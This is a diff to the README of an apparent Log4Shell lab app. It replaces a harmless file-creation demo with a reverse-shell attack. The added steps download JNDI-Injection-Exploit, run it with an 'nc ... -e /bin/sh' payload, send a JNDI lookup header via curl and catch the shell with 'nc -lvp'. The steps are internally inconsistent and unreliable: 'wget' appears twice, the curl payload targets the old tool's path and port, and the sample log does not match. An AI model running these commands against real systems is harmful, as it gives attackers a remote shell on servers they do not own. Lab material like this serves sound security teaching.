@@ -26,42 +26,31 @@ docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 * Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
 ```bash
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
-unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+wget wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C nc <privateIP> 8083 -e /bin/sh -A <privateIP>
 ```
 
 * Then, trigger the exploit using:
 
 ```bash
-# will execute 'touch /tmp/pwned'
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+```
+
+* Then, listen from the attacking machine on the port we want to receive the connection
+```bash
+nc -lvp 8083
 ```
 
 * Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
 
 ```
-[+] LDAP Server Start Listening on 1389...
-[+] HTTP Server Start Listening on 8888...
-[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
-[+] Paylaod: command
-[+] Command: touch /tmp/pwned
-
-[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
-[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
-[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
-[+] Receive ClassRequest: Exploitjkk87OnvOH.class
-[+] Response Code: 200
+2021-12-15 10:42:16 [LDAPSERVER] >> Send LDAP reference result for lcogih redirecting to http://54.243.12.192:8180/ExecTemplateJDK8.class
+2021-12-15 10:42:16 [JETTYSERVER]>> Log a request to http://54.243.12.192:8180/ExecTemplateJDK8.class
 ```
 
-* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
+* To confirm that the code execution was successful, notice the shell opened with the attacker machine:
 
-```
-$ docker exec vulnerable-app ls /tmp
-...
-pwned
-...
-```
 
 ## Reference
 
